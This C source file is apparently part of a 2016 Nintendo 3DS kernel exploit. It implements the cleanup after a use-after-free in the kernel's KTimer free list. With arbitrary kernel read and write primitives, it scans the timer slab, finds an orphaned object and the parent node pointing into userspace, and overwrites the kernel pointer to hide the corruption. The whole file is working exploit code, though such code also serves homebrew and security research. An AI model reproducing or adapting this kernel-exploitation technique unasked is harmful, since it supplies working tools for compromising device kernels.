/* cleanup.c Ned Williamson 2016 */

#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <util.h>
#include "cleanup.h"
#include "backdoor.h"
#include "exploit.h"

extern void *ktimer_pool_head;
extern u32 ktimer_pool_size;
extern u32 ktimer_base_offset;

/* is this valid across versions? */
#define KTIMER_OBJECT_SIZE 0x3C

/* This should really be IS_VTABLE but different mappings make it hard
 * to generalize this value. The only base pointers in the slab heap
 * are pointers to the vtable, pointers to kernel objects, and NULL,
 * so this overapproximation is worth the precision tradeoff.
 */
#define IS_KERNEL_NON_SLAB_HEAP(addr) (0xFFF00000 <= (u32)(addr) && (u32)(addr) < 0xFFF70000)
#define TOBJ_ADDR_TO_IDX(base, addr) (((u32)(addr) - (u32)(base)) / KTIMER_OBJECT_SIZE)
#define TOBJ_IDX_TO_ADDR(base, idx) ((u32)(base) + KTIMER_OBJECT_SIZE * (u32)(idx))

static void *find_orphan() {
  u32 num_timer_objects = ktimer_pool_size / KTIMER_OBJECT_SIZE;
  void *ktimer_base = (void *)(0xFFF70000 + ktimer_base_offset);
  void *ktimer_end = (void *)((u32)ktimer_base + (num_timer_objects * KTIMER_OBJECT_SIZE));

  bool reachable[num_timer_objects];
  memset(reachable, 0, num_timer_objects * sizeof(bool));

  u32 i = 0;
  /* go through the timer table and find all reachable objects */
  for (void *current_timer = ktimer_base;
       current_timer < ktimer_end;
       current_timer += KTIMER_OBJECT_SIZE, i++) {
    void *child = (void *)kreadint(current_timer);

    if (TOBJ_ADDR_TO_IDX(ktimer_base, current_timer) != i) {
      printf("[!] Got TOBJ_ADDR_TO_IDX(current_timer) != i: 0x%lx != 0x%lx\n",
             TOBJ_ADDR_TO_IDX(ktimer_base, current_timer), i);
      wait_for_user();
    }

    if (IS_KERNEL_NON_SLAB_HEAP(child)) {
      /* object is allocated, therefore reachable */
      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, current_timer)] = true;
    } else if (ktimer_base <= child && child < ktimer_end) {
      /* object is freed, next pointer is reachable */
      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = true;
    } else if (child != NULL && child != (void *)TIMER2_NEXT_KERNEL) {
      printf("[!] Warning! Timer table entry had non-vtable, non-freed entry!\n");
      printf("It looks like this: %p -> %p\n", current_timer, child);
      wait_for_user();
    }
  }

  if (i != num_timer_objects) {
    printf("[!] Unexpected number of iterations over timer object list.\n");
    printf("[!] Got %lu, expected %lu.\n", i, num_timer_objects);
    return NULL;
  }

  /* account for list head */
  void *first_freed = (void *)kreadint_real(ktimer_pool_head);
  if (first_freed) {
    reachable[TOBJ_ADDR_TO_IDX(ktimer_base, first_freed)] = true;
  }

  u32 num_unreachable = 0;
  void *orphan = NULL;
  for (i = 0; i < num_timer_objects; i++) {
    if (!reachable[i]) {
      num_unreachable++;
      /* update only if necessary */
      orphan = orphan ? orphan : (void *)TOBJ_IDX_TO_ADDR(ktimer_base, i);
    }
  }
  if (num_unreachable != 1) {
    printf("[!] Warning: expected one reachable node, found %ld!\n", num_unreachable);
  }

  return orphan;
}

static void **find_parent() {
  // traverse linked list until next points to userspace
  void *current_node = ktimer_pool_head;
  while (true) {
    void *next = (void *)kreadint_real(current_node);

    if (next == (void *)TIMER2_NEXT_KERNEL) {
      return current_node;
    } else if (next == NULL) {
      return NULL;
    }

    current_node = next;
  }
}

bool cleanup_uaf() {
  /* TODO: this entire function is TOCTTOU of kernel free list state */
  /* at this point the kernel timer free list contains a userspace item.
   * we need to fix that.
   */

  void **parent = find_parent();
  if (!parent) {
    printf("[-] Failed to find parent in KTimer linked list.\n");
    return false;
  }

  void *orphan = find_orphan();
  if (!orphan) {
    printf("[-] Failed to find orphan in KTimer linked list.\n");
    return false;
  }

  printf("Found parent and orphan: %p -> %p\n", parent, orphan);

  kwriteint_real((u32 *)parent, (u32)orphan);
  return true;
}
